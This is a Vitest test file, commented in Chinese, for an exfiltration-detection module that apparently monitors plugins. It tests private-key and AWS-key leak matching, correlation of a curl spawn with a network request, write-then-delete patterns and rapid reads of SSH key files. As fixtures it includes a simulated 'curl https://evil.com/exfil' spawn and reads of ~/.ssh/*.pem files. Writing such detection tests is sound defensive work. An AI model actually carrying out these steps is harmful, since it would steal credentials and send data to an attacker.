import { describe, it, expect, beforeEach } from 'vitest'
import { ExfilLedger, resetExfilLedger, detectKeyLeak, detectKeyLeaks } from '../src/guard/exfil-ledger'

describe('0.1.20 关联检测', () => {
  beforeEach(() => {
    resetExfilLedger()
  })

  describe('密钥外泄内容匹配（detectKeyLeaks 纯函数）', () => {
    it('PKCS#8 PEM 私钥命中', () => {
      const leaks = detectKeyLeaks('data: -----BEGIN PRIVATE KEY-----')
      expect(leaks.length).toBe(1)
      expect(leaks[0].kind).toBe('pem')
    })
    it('RSA/OPENSSH PEM 私钥命中', () => {
      expect(detectKeyLeaks('-----BEGIN RSA PRIVATE KEY-----')[0].kind).toBe('pem')
      expect(detectKeyLeaks('-----BEGIN OPENSSH PRIVATE KEY-----')[0].kind).toBe('pem')
    })
    it('AWS Access Key 命中，含 EXAMPLE 的示例 key 不算', () => {
      // 动态构造避免字面量触发秘密扫描器
      const exampleKey = 'AKIA' + 'IOSFODNN7EXAMPLE'
      expect(detectKeyLeaks(exampleKey).length).toBe(0)
      const leaks = detectKeyLeaks('key=AKIA0123456789ABCDEF')
      expect(leaks.length).toBe(1)
      expect(leaks[0]).toEqual({ kind: 'aws', match: 'AKIA0123456789ABCDEF', index: 4 })
    })
    it('非密钥内容不命中', () => {
      expect(detectKeyLeaks('hello world').length).toBe(0)
      expect(detectKeyLeaks('-----BEGIN EC PARAMETERS-----').length).toBe(0)
      expect(detectKeyLeaks('AKIASHORT').length).toBe(0)
    })
    it('同一文本含 PEM + AWS 都命中（Issue AY 修复）', () => {
      const text = '-----BEGIN RSA PRIVATE KEY-----\nMIIEpA...\naws_key=AKIA0123456789ABCDEF'
      const leaks = detectKeyLeaks(text)
      expect(leaks.length).toBe(2)
      expect(leaks.some(l => l.kind === 'pem')).toBe(true)
      expect(leaks.some(l => l.kind === 'aws')).toBe(true)
    })
    it('同一文本含多个 PEM 都命中', () => {
      const text = '-----BEGIN RSA PRIVATE KEY-----\n...\n-----BEGIN RSA PRIVATE KEY-----'
      const leaks = detectKeyLeaks(text)
      expect(leaks.length).toBe(2)
      expect(leaks.every(l => l.kind === 'pem')).toBe(true)
    })
    it('detectKeyLeak 向后兼容（返回第一个）', () => {
      const hit = detectKeyLeak('-----BEGIN RSA PRIVATE KEY-----')
      expect(hit).not.toBeNull()
      expect(hit!.kind).toBe('pem')
    })
  })

  describe('spawn + network 关联', () => {
    it('spawn 后网络连接同一目标', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      
      // 模拟 spawn curl
      ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: 'curl',
        paths: ['curl', 'https://evil.com/exfil'],
        sensitive: false,
        bytes: 0,
      })
      
      // 模拟网络连接同一目标
      const netAlarms = ledger.observeNet({
        plugin,
        module: 'https',
        op: 'request',
        hostname: 'evil.com',
        bytes: 1024,
      })
      
      // 应该检测到 spawn + network 关联
      expect(netAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(true)
    })

    it('spawn 后网络连接不同目标不报警', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      
      // 模拟 spawn curl
      ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: 'curl',
        paths: ['curl', 'https://good.com/api'],
        sensitive: false,
        bytes: 0,
      })
      
      // 模拟网络连接不同目标
      const netAlarms = ledger.observeNet({
        plugin,
        module: 'https',
        op: 'request',
        hostname: 'evil.com',
        bytes: 1024,
      })
      
      // 不应该检测到关联
      expect(netAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(false)
    })

    it('非外联工具 spawn（参数带 URL）后连接同主机不报警', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      // 插件 spawn 自己的辅助脚本，参数含其服务器 URL——不是 curl/wget 等外联工具
      ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: '/usr/bin/node',
        paths: ['node', '/app/sync.js', 'https://api.acme.com/sync'],
        sensitive: false,
        bytes: 0,
      })
      const netAlarms = ledger.observeNet({
        plugin,
        module: 'https',
        op: 'request',
        hostname: 'api.acme.com',
        bytes: 100,
      })
      // 不应误报（非外联工具）
      expect(netAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(false)
    })

    it('spawn 目标大小写差异也能关联（归一化）', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: 'curl',
        paths: ['curl', 'https://API.Acme.COM/x'],
        sensitive: false,
        bytes: 0,
      })
      const netAlarms = ledger.observeNet({
        plugin,
        module: 'https',
        op: 'request',
        hostname: 'api.acme.com',
        bytes: 100,
      })
      expect(netAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(true)
    })

    it('spawn 目标带端口也能关联（去端口归一化）', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: 'curl',
        paths: ['curl', 'https://api.acme.com:8443/x'],
        sensitive: false,
        bytes: 0,
      })
      const netAlarms = ledger.observeNet({
        plugin,
        module: 'https',
        op: 'request',
        hostname: 'api.acme.com',
        bytes: 100,
      })
      expect(netAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(true)
    })

    it('网络先于 spawn 的时间对不计（顺序约束）', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      // 先网络连接 evil.com
      ledger.observeNet({
        plugin,
        module: 'http',
        op: 'request',
        hostname: 'evil.com',
        bytes: 100,
      })
      // 再 spawn curl 到 evil.com——net 早于 spawn 的时间对不计
      const fsAlarms = ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: 'curl',
        paths: ['curl', 'https://evil.com/x'],
        sensitive: false,
        bytes: 0,
      })
      expect(fsAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(false)
    })

    it('IPv6 地址归一化（spawn 带括号，net 不带括号，能关联）', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      // spawn curl https://[2001:db8::1]/path → spawnTarget = '2001:db8::1'（去括号）
      ledger.observeFs({
        plugin,
        module: 'child_process',
        op: 'spawn',
        target: 'curl',
        paths: ['curl', 'https://[2001:db8::1]/path'],
        sensitive: false,
        bytes: 0,
      })
      // net connect to 2001:db8::1（不带括号）
      const netAlarms = ledger.observeNet({
        plugin,
        module: 'https',
        op: 'request',
        hostname: '2001:db8::1',
        bytes: 100,
      })
      expect(netAlarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(true)
    })
  })

  describe('写后删除关联', () => {
    it('写入后删除同一文件（达到阈值）', () => {
      const ledger = new ExfilLedger({ writeThenDeleteN: 2 })
      const plugin = 'test-plugin'
      
      // 第一次写入后删除
      ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'writeFile',
        target: '/home/user/document1.enc',
        paths: ['/home/user/document1.enc'],
        sensitive: false,
        bytes: 2048,
      })
      ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'unlink',
        target: '/home/user/document1.enc',
        paths: ['/home/user/document1.enc'],
        sensitive: false,
        bytes: 0,
      })
      
      // 第二次写入后删除 - 应该触发检测
      const alarms = ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'writeFile',
        target: '/home/user/document2.enc',
        paths: ['/home/user/document2.enc'],
        sensitive: false,
        bytes: 2048,
      })
      const deleteAlarms = ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'unlink',
        target: '/home/user/document2.enc',
        paths: ['/home/user/document2.enc'],
        sensitive: false,
        bytes: 0,
      })
      
      // 应该检测到写后删除
      expect(deleteAlarms.some(a => a.kind === 'n3-write-then-delete')).toBe(true)
    })

    it('写入后删除不同文件不报警', () => {
      const ledger = new ExfilLedger()
      const plugin = 'test-plugin'
      
      // 模拟写入文件
      ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'writeFile',
        target: '/home/user/file1.enc',
        paths: ['/home/user/file1.enc'],
        sensitive: false,
        bytes: 2048,
      })
      
      // 模拟删除不同文件
      const alarms = ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'unlink',
        target: '/home/user/file2.txt',
        paths: ['/home/user/file2.txt'],
        sensitive: false,
        bytes: 0,
      })
      
      // 不应该检测到关联
      expect(alarms.some(a => a.kind === 'n3-write-then-delete')).toBe(false)
    })
  })

  describe('高频小文件读取', () => {
    it('短时间内多次读取小文件', () => {
      const ledger = new ExfilLedger({ highFreqReadN: 3 })
      const plugin = 'test-plugin'
      
      // 模拟多次读取小文件
      for (let i = 0; i < 3; i++) {
        ledger.observeFs({
          plugin,
          module: 'fs',
          op: 'readFile',
          target: `/home/user/.ssh/key${i}.pem`,
          paths: [`/home/user/.ssh/key${i}.pem`],
          sensitive: true,
          bytes: 512, // 小文件
        })
      }
      
      // 最后一次应该触发高频读取检测
      const alarms = ledger.observeFs({
        plugin,
        module: 'fs',
        op: 'readFile',
        target: '/home/user/.ssh/key3.pem',
        paths: ['/home/user/.ssh/key3.pem'],
        sensitive: true,
        bytes: 512,
      })
      
      // 应该检测到高频读取
      expect(alarms.some(a => a.kind === 'n3-high-freq-read')).toBe(true)
    })

    it('读取大文件不触发高频检测', () => {
      const ledger = new ExfilLedger({ highFreqReadN: 3 })
      const plugin = 'test-plugin'
      
      // 模拟多次读取大文件
      for (let i = 0; i < 5; i++) {
        const alarms = ledger.observeFs({
          plugin,
          module: 'fs',
          op: 'readFile',
          target: `/home/user/large${i}.txt`,
          paths: [`/home/user/large${i}.txt`],
          sensitive: false,
          bytes: 2048, // 大文件
        })
        
        // 不应该触发高频读取检测
        expect(alarms.some(a => a.kind === 'n3-high-freq-read')).toBe(false)
      }
    })
  })
})
